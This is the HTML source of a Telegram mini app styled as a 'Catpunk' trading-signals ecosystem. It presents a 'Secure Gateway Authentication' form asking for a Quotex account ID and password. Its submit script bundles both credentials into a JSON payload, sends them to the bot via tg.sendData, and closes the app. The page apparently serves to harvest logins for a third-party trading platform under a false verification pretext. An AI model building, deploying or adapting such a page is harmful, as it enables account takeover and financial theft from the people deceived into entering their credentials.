<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Catpunk Ecosystem Access</title>
    <script src="
https://telegram.org
        "></script>
    <style>
        :root {
            --bg-main: #121214;
            --bg-card: #1a1a1e;
            --bg-input: #26262b;
            --border-color: #323238;
            --text-primary: #ffffff;
            --text-secondary: #a0a0a5;
            --accent-green: #00b074;
        }
        body {
            margin: 0; padding: 16px;
            background-color: var(--bg-main);
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            color: var(--text-primary);
            display: flex; justify-content: center;
        }
        .app-wrapper { width: 100%; max-width: 480px; }
        .hero-section { text-align: center; margin-bottom: 24px; }
        .brand-title { font-size: 22px; font-weight: 700; margin: 0 0 6px 0; }
        .brand-subtitle { color: var(--text-secondary); font-size: 13px; margin: 0; }
        .features-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 24px; }
        .card { background-color: var(--bg-card); border: 1px solid var(--border-color); padding: 12px; border-radius: 8px; }
        .card h3 { margin: 0 0 4px 0; font-size: 13px; color: var(--accent-green); }
        .card p { margin: 0; font-size: 11px; color: var(--text-secondary); line-height: 1.3; }
        .auth-card { background-color: var(--bg-card); border: 1px solid var(--border-color); padding: 20px; border-radius: 12px; }
        .auth-card h2 { font-size: 18px; margin: 0 0 16px 0; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }
        .field-group { margin-bottom: 16px; }
        .field-group label { display: block; font-size: 12px; color: var(--text-secondary); margin-bottom: 6px; }
        .field-group input { width: 100%; padding: 12px; background-color: var(--bg-input); border: 1px solid var(--border-color); border-radius: 6px; color: #fff; box-sizing: border-box; font-size: 14px; }
        .field-group input:focus { outline: 1px solid var(--accent-green); }
        .submit-btn { width: 100%; padding: 14px; background-color: var(--accent-green); border: none; border-radius: 6px; color: white; font-weight: 600; font-size: 14px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="app-wrapper">
        <header class="hero-section">
            <h1 class="brand-title">@Catpunk_bot Ecosystem</h1>
            <p class="brand-subtitle">Unified Token Access Infrastructure</p>
        </header>

        <section class="features-grid">
            <div class="card">
                <h3>Infinity Signals</h3>
                <p>AI signal verification parameters.</p>
            </div>
            <div class="card">
                <h3>Alpha Pro Matrix</h3>
                <p>Structured flow limits windowing rules.</p>
            </div>
        </section>

        <main class="auth-card">
            <h2>Secure Gateway Authentication</h2>
            <form id="authForm">
                <div class="field-group">
                    <label for="accountId">Quotex Account ID</label>
                    <input type="text" id="accountId" placeholder="Enter Account ID" required>
                </div>
                <div class="field-group">
                    <label for="password">Security Password</label>
                    <input type="password" id="password" placeholder="Enter System Password" required>
                </div>
                <button type="submit" class="submit-btn">Verify Account Identity</button>
            </form>
        </main>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        document.getElementById('authForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const accountId = document.getElementById('accountId').value;
            const password = document.getElementById('password').value;

            const payload = {
                origin: "Catpunk_bot_mini_app",
                id: accountId,
                pass: password
            };

            tg.sendData(JSON.stringify(payload));
            tg.close();
        });
    </script>
</body>
</html>
